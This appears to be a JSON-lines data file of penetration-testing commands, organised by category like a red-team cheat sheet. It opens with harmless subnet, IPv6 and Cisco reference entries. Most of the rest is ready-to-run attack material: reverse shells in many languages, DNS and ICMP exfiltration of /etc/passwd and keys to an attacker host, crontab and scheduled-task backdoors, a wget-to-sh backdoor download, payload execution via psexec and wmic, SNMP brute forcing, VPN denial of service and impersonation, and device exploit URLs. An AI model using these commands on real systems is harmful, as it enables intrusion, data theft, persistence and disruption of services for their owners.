+{"category": "Networking", "command": "/29: 255.255.255.248 (6 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/28: 255.255.255.240 (14 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/27: 255.255.255.224 (30 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/26: 255.255.255.192 (62 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/25: 255.255.255.128 (126 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/24: 255.255.255.0 (254 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/23: 255.255.254.0 (510 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/22: 255.255.252.0 (1022 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/21: 255.255.248.0 (2046 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/20: 255.255.240.0 (4094 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/19: 255.255.224.0 (8190 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/18: 255.255.192.0 (16382 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/17: 255.255.128.0 (32766 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/16: 255.255.0.0 (65534 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/15: 255.254.0.0 (131070 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/14: 255.252.0.0 (262142 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/13: 255.248.0.0 (524286 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/12: 255.240.0.0 (1048574 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/11: 255.224.0.0 (2097150 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/10: 255.192.0.0 (4194302 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/9: 255.128.0.0 (8388606 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/8: 255.0.0.0 (16777214 Hosts)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "Given: 1.1.1.101/28; Netmask: 255.255.255.240; Range: 1.1.1.96 - 1.1.1.111", "description": "Calculate subnet range"}
+{"category": "Networking", "command": "ff02::1", "description": "IPv6 broadcast: link-local nodes"}
+{"category": "Networking", "command": "ff05::1", "description": "IPv6 broadcast: site-local nodes"}
+{"category": "Networking", "command": "ff01::2", "description": "IPv6 broadcast: node-local routers"}
+{"category": "Networking", "command": "ff02::2", "description": "IPv6 broadcast: link-local routers"}
+{"category": "Networking", "command": "ff05::2", "description": "IPv6 broadcast: site-local routers"}
+{"category": "Networking", "command": "fe80::", "description": "IPv6 interface: link-local"}
+{"category": "Networking", "command": "2001::", "description": "IPv6 interface: routable"}
+{"category": "Networking", "command": "::a.b.c.d", "description": "IPv6 interface: IPv4 compatible"}
+{"category": "Networking", "command": "::ffff:a.b.c.d", "description": "IPv6 interface: IPv4 mapped"}
+{"category": "IPv6 Tools", "command": "rsmurf6 eth0 remote_ipv6", "description": "THC IPv6 Toolkit: Remote Network DoS"}
+{"category": "IPv6 Tools", "command": "socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80", "description": "SOCAT tunnel IPv6 through IPv4"}
+{"category": "IPv6 Tools", "command": "./nikto.pl -host 127.0.0.1 -port 8080", "description": "Scan tunneled IPv6 host with Nikto"}
+{"category": "CISCO Commands", "command": "configure terminal", "description": "Enter global configuration mode"}
+{"category": "CISCO Commands", "command": "(config)#interface fa0/0", "description": "Configure FastEthernet 0/0"}
+{"category": "CISCO Commands", "command": "(config-if)#ip address 1.1.1.1 255.255.255.0", "description": "Add IP to fa0/0"}
+{"category": "CISCO Commands", "command": "(config)#line vty 0 4", "description": "Configure VTY lines"}
+{"category": "CISCO Commands", "command": "(config-line)#login", "description": "Enable login for VTY"}
+{"category": "CISCO Commands", "command": "(config-line)#password password", "description": "Set VTY password"}
+{"category": "CISCO Commands", "command": "show sessions", "description": "Display open sessions"}
+{"category": "CISCO Commands", "command": "show version", "description": "Display IOS version"}
+{"category": "CISCO Commands", "command": "dir file systems", "description": "List available files"}
+{"category": "CISCO Commands", "command": "dir all-filesystems", "description": "List file information"}
+{"category": "CISCO Commands", "command": "dir /all", "description": "List deleted files"}
+{"category": "CISCO Commands", "command": "show running-config", "description": "Display config loaded in memory"}
+{"category": "CISCO Commands", "command": "show startup-config", "description": "Display config loaded at boot"}
+{"category": "CISCO Commands", "command": "show ip interface brief", "description": "Display interface summary"}
+{"category": "CISCO Commands", "command": "show interface e0", "description": "Display detailed interface info"}
+{"category": "CISCO Commands", "command": "show ip route", "description": "Display routes"}
+{"category": "CISCO Commands", "command": "show access-lists", "description": "Display access lists"}
+{"category": "CISCO Commands", "command": "terminal length 0", "description": "No limit on output"}
+{"category": "CISCO Commands", "command": "copy running-config startup-config", "description": "Save running config to startup"}
+{"category": "CISCO Commands", "command": "copy running-config tftp", "description": "Copy running config to TFTP server"}
+{"category": "CISCO Commands", "command": "http://ip/level/16-99/exec/show/config", "description": "Exploit Cisco IOS 11.2-12.2 vulnerability"}
+{"category": "SNMP", "command": "./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt snmpstrings.txt", "description": "SNMP brute force with snmpblow.pl"}
+{"category": "SNMP", "command": "snmpwalk -c public -v1 ip .1 | grep hrSWRunName | cut -d\" \" -f4", "description": "List Windows running services"}
+{"category": "SNMP", "command": "snmpwalk -c public -v1 ip .1 | grep tcpConnState | cut -d\" \" -f6 | sort -u", "description": "List Windows open TCP ports"}
+{"category": "SNMP", "command": "snmpwalk -c public -v1 ip .1 | grep hrSWInstalledName", "description": "List Windows installed software"}
+{"category": "SNMP", "command": "snmpwalk -c public -v1 ip 1.3 | grep --.1.2.25 | cut -d\" \" -f4", "description": "List Windows users"}
+{"category": "Packet Capturing", "command": "tcpdump -nvvX -s0 -i eth0 tcp portrange 22-23", "description": "Capture TCP traffic on ports 22-23"}
+{"category": "Packet Capturing", "command": "tcpdump -i eth0 -tttt dst ip and not net 1.1.1.0/24", "description": "Capture traffic to IP excluding subnet"}
+{"category": "Packet Capturing", "command": "tcpdump net 192.1.1.0/24", "description": "Capture traffic between local 192.1.1.0/24"}
+{"category": "Packet Capturing", "command": "dumpcap -i eth0 -a duration:sec -w file.pcap", "description": "Capture traffic for specified seconds"}
+{"category": "Packet Capturing", "command": "file2cable -i eth0 -f file.pcap", "description": "Replay PCAP file"}
+{"category": "Packet Capturing", "command": "tcpreplay --topspeed --loop=0 --intf=eth0 pcap_file_to_replay", "description": "Replay packets (possible DoS)"}
+{"category": "DNS", "command": "./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20", "description": "Reverse lookup for IP range"}
+{"category": "DNS", "command": "./dnsrecon.rb -t std -d domain.com", "description": "Retrieve standard DNS records"}
+{"category": "DNS", "command": "./dnsrecon.rb -t brt -d domain.com -w hosts.txt", "description": "Enumerate subdomains"}
+{"category": "DNS", "command": "./dnsrecon -d domain.com -t axfr", "description": "DNS zone transfer"}
+{"category": "DNS", "command": "nmap -R -sL -Pn -dns-servers dns_svr_ip range | awk '{if(($1\" \"$2\" \"$3)==\"Nmap scan report\") print $5\" \"$6}' | sed 's/(//g' | sed 's/)//g' > dns.txt", "description": "Nmap reverse DNS lookup and output parser"}
+{"category": "VPN", "command": "ike-scan -M -A vpn_ip -P file", "description": "Write PSK to file"}
+{"category": "VPN", "command": "ike-scan -A -t 1 --sourceip=spoof_ip dst_ip", "description": "DoS VPN server"}
+{"category": "VPN", "command": "if (ip.proto == UDP && udp.src == 500) { kill(); drop(); msg(\"UDP packet dropped!\"); }", "description": "Ettercap filter to drop IPSEC traffic (UDP 500)"}
+{"category": "VPN", "command": "etterfilter udpdrop.filter -o udpdrop.ef", "description": "Compile Ettercap filter"}
+{"category": "VPN", "command": "ettercap -T -q -M arp -F udpdrop.ef // //", "description": "Start Ettercap to drop IPSEC traffic"}
+{"category": "VPN", "command": "echo 1 > /proc/sys/net/ipv4/ip_forward", "description": "Enable IP forwarding"}
+{"category": "VPN", "command": "iptables -t nat -A PREROUTING -p udp -i eth0 -d VPN_Server_IP -j DNAT --to Attacking_Host_IP; iptables -P FORWARD ACCEPT", "description": "Configure iptables for port forwarding to Fiked"}
+{"category": "VPN", "command": "fiked -g vpn_gateway_ip -k VPN_Group_Name:Group_Pre-Shared_Key", "description": "Start Fiked to impersonate VPN server"}
+{"category": "VPN", "command": "ettercap -T -M arp // //", "description": "Restart Ettercap without filter"}
+{"category": "PuTTY", "command": "[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\Default%20Settings] \"LogFileName\"=\"%TEMP%\\\\putty.dat\" \"LogType\"=dword:00000002", "description": "Registry key to log all PuTTY activity"}
+{"category": "File Transfer", "command": "echo open ip 21 > ftp.txt; echo user >> ftp.txt; echo pass >> ftp.txt; echo bin >> ftp.txt; echo GET file >> ftp.txt; echo bye >> ftp.txt; ftp -s:ftp.txt", "description": "Execute FTP commands from script file"}
+{"category": "File Transfer", "command": "ncat ip 21 < ftp.txt", "description": "Alternative FTP transfer using ncat"}
+{"category": "File Transfer", "command": "xxd -p secret file.hex", "description": "Hex encode file on victim (Linux)"}
+{"category": "File Transfer", "command": "for b in $(cat file.hex); do dig $b.shell.evilexample.com; done", "description": "DNS lookup for each hex line (victim)"}
+{"category": "File Transfer", "command": "tcpdump -w /tmp/dns -s0 port 53 and host system.example.com", "description": "Capture DNS exfil packets (attacker)"}
+{"category": "File Transfer", "command": "tcpdump -r /tmp/dns -n | grep shell.evilexample.com | cut -f9 -d' ' | cut -f1 -d'.' | uniq > received.txt", "description": "Extract hex from DNS packets (attacker)"}
+{"category": "File Transfer", "command": "xxd -r -p received.txt keys.pgp", "description": "Reverse hex encoding (attacker)"}
+{"category": "File Transfer", "command": "stringZ=$(cat /etc/passwd | od -tx1 | cut -c8- | tr -d \" \" | tr -d \"\\n\"); counter=0; while [ $counter -lt ${#stringZ} ]; do ping -s 16 -c 1 -p ${stringZ:$counter:16} 192.168.10.10 && counter=$((counter+16)); done", "description": "Exfil command output over ICMP (victim)"}
+{"category": "File Transfer", "command": "tcpdump -ntvvSxs 0 'icmp[0]=8' -w data.dmp; grep Ox0020 data.dmp | cut -c21- | tr -d \" \" | tr -d \"\\n\" | xxd -r -p", "description": "Capture and parse ICMP exfil (attacker)"}
+{"category": "File Transfer", "command": "telnet x.x.x.x 25; HELO x.x.x.x; MAIL FROM: me@you.com; RCPT TO: you@you.com; DATA; Thank You.; .; quit", "description": "Send email via telnet (open mail relay)"}
+{"category": "Reverse Shells", "command": "nc 10.0.0.1 1234 -e /bin/sh", "description": "Netcat reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "ncat 10.0.0.1 1234 --exec /bin/sh", "description": "Ncat reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "nc 10.0.0.1 1234 -e cmd.exe", "description": "Netcat reverse shell (Windows)"}
+{"category": "Reverse Shells", "command": "ncat 10.0.0.1 1234 --exec cmd.exe", "description": "Ncat reverse shell (Windows)"}
+{"category": "Reverse Shells", "command": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f", "description": "Netcat reverse shell without -e option"}
+{"category": "Reverse Shells", "command": "socat TCP:10.0.0.1:1234 EXEC:/bin/sh", "description": "Socat reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "perl -e 'use Socket; $i=\"10.0.0.1\"; $p=1234; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\"); };'", "description": "Perl reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "perl -MIO -e '$p=fork; exit if $p; $c=new IO::Socket::INET(PeerAddr,\"attackerip:4444\"); STDIN->fdopen($c,r); $~->fdopen($c,w); system $_ while <>; '", "description": "Perl reverse shell without /bin/sh"}
+{"category": "Reverse Shells", "command": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"attackerip:4444\"); STDIN->fdopen($c,r); $~->fdopen($c,w); system $_ while <>; '", "description": "Perl reverse shell (Windows)"}
+{"category": "Reverse Shells", "command": "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "description": "Python reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "description": "Bash reverse shell"}
+{"category": "Reverse Shells", "command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();", "description": "Java reverse shell"}
+{"category": "Reverse Shells", "command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234); exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "description": "PHP reverse shell"}
+{"category": "Reverse Shells", "command": "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",1234).to_i; exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "description": "Ruby reverse shell (Linux)"}
+{"category": "Reverse Shells", "command": "ruby -rsocket -e 'exit if fork; c=TCPSocket.new(\"attackerip\",\"4444\"); while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'", "description": "Ruby reverse shell without /bin/sh"}
+{"category": "Reverse Shells", "command": "ruby -rsocket -e 'c=TCPSocket.new(\"attackerip\",\"4444\"); while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'", "description": "Ruby reverse shell (Windows)"}
+{"category": "Reverse Shells", "command": "rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0</tmp/p | /bin/bash 1>/tmp/p", "description": "Telnet reverse shell (option 1)"}
+{"category": "Reverse Shells", "command": "telnet attackerip 4444 | /bin/bash | telnet attackerip 4445", "description": "Telnet reverse shell (option 2)"}
+{"category": "Reverse Shells", "command": "xterm -display 10.0.0.1:1; Xnest :1; xhost +victimIP", "description": "Xterm reverse shell with listener setup"}
+{"category": "Persistence", "command": "crontab -e; 0-59/10 * * * * nc ip 777 -e /bin/bash", "description": "Linux persistence via crontab (every 10 min)"}
+{"category": "Persistence", "command": "sc config schedule start=auto; net start schedule; at 13:30 \"C:\\nc.exe ip 777 -e cmd.exe\"", "description": "Windows task scheduler persistence (legacy)"}
+{"category": "Persistence", "command": "schtasks /create /tn \"Backdoor\" /tr \"C:\\nc.exe ip 777 -e cmd.exe\" /sc daily /st 13:30 /ru System", "description": "Windows task scheduler persistence (modern)"}
+{"category": "Persistence", "command": "REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v firewall /t REG_SZ /d \"c:\\windows\\system32\\backdoor.exe\" /f; at 19:00 /every:M,T,W,Th,F cmd /c start \"%USERPROFILE%\\backdoor.exe\"; SCHTASKS /Create /RU \"SYSTEM\" /SC MINUTE /MO 45 /TN FIREWALL /TR \"%USERPROFILE%\\backdoor.exe\" /ED 12/12/2012", "description": "Windows persistent backdoor with firewall bypass"}
+{"category": "Persistence", "command": "wget http://server/backdoor.sh -O - | sh", "description": "Download and run backdoor script (Linux)"}
+{"category": "Remote Payload Deployment", "command": "net share payload_share=C:\\payload_folder /grant:Everyone,FULL", "description": "Share payload folder via SMB (victim)"}
+{"category": "Remote Payload Deployment", "command": "psexec \\\\remote_ip /u domain\\compromised_user /p password \"\\\\payload_ip\\test\\msf.exe\"", "description": "Execute payload via SMB (psexec)"}
+{"category": "Remote Payload Deployment", "command": "wmic /node:remote_ip /user:domain\\compromised_user /password:password process call create \"\\\\payload_ip\\test\\msf.exe\"", "description": "Execute payload via SMB (wmic)"}
+{"category": "Remote Payload Deployment", "command": "use auxiliary/server/webdav_file_server; set localexe true; set localfile payload; set localroot payload_directory; set disablePayloadHandler true; run; psexec \\\\remote_ip /u domain\\compromised_user /p password \"\\\\payload_ip\\test\\msf.exe\"", "description": "Deploy payload via WebDAV (Metasploit)"}
+{"category": "Tunneling", "command": "fpipe.exe -l 1234 -r 80 2.2.2.2", "description": "Listen on 1234, forward to port 80"}
+{"category": "Tunneling", "command": "socks.exe -i 1.1.1.1 -p 8080", "description": "SOCKS proxy on redirector (1.1.1.1:8080)"}
+{"category": "Tunneling", "command": "proxychains4 nmap -Pn -vv -sT -p 22,135,139,445 2.2.2.2", "description": "Scan intranet through SOCKS proxy"}
+{"category": "Tunneling", "command": "socat TCP4-LISTEN:1234 TCP4:2.2.2.2:80", "description": "Listen on 1234, forward to port 80"}
+{"category": "Tunneling", "command": "echo -e \"[netcat client]\\nclient = yes\\naccept = 5555\\nconnect = listening_ip:4444\" > /etc/stunnel/stunnel.conf; echo -e \"[netcat server]\\nclient = no\\naccept = 4444\\nconnect = 127.0.0.1:4444\" > /etc/stunnel/stunnel.conf; stunnel; nc -vlp 4444", "description": "SSL encapsulated netcat tunnel"}
+{"category": "Google Hacking", "command": "numrange:[#]-[#]", "description": "Search within a number range"}
+{"category": "Google Hacking", "command": "date:[#]", "description": "Search within past [#] months"}
+{"category": "Google Hacking", "command": "link:[url]", "description": "Find pages that link to [url]"}
+{"category": "Google Hacking", "command": "related:[url]", "description": "Find pages related to [url]"}
+{"category": "Google Hacking", "command": "intitle:[string]", "description": "Find pages with [string] in title"}
+{"category": "Google Hacking", "command": "inurl:[string]", "description": "Find pages with [string] in URL"}
+{"category": "Google Hacking", "command": "filetype:[xls]", "description": "Find files of type xls"}
+{"category": "Google Hacking", "command": "phonebook:[name]", "description": "Find phone book listings of [name]"}
+{"category": "Video Teleconferencing", "command": "telnet ip", "description": "Polycom: Enter 1 char to get uname:pwd"}
+{"category": "Video Teleconferencing", "command": "http://ip/getsecure.cgi", "description": "Polycom: Access secure config"}
+{"category": "Video Teleconferencing", "command": "http://ip/erarcl.htm", "description": "Polycom: Access remote control"}
+{"category": "Video Teleconferencing", "command": "http://ip/asecurity.htm", "description": "Polycom: Access security settings"}
+{"category": "Video Teleconferencing", "command": "http://ip/arc.htm", "description": "Polycom: Access remote control"}
+{"category": "Video Teleconferencing", "command": "http://ip/firmwareVersion", "description": "Polycom: Check firmware version"}
+{"category": "Video Teleconferencing", "command": "http://ip/snapctrl.ssi", "description": "Tandberg: Access snapshot control"}
+{"category": "Video Teleconferencing", "command": "http://ip/command/visca-gen.cgi?visca=8101046202FF", "description": "Sony Webcam: Freeze camera"}
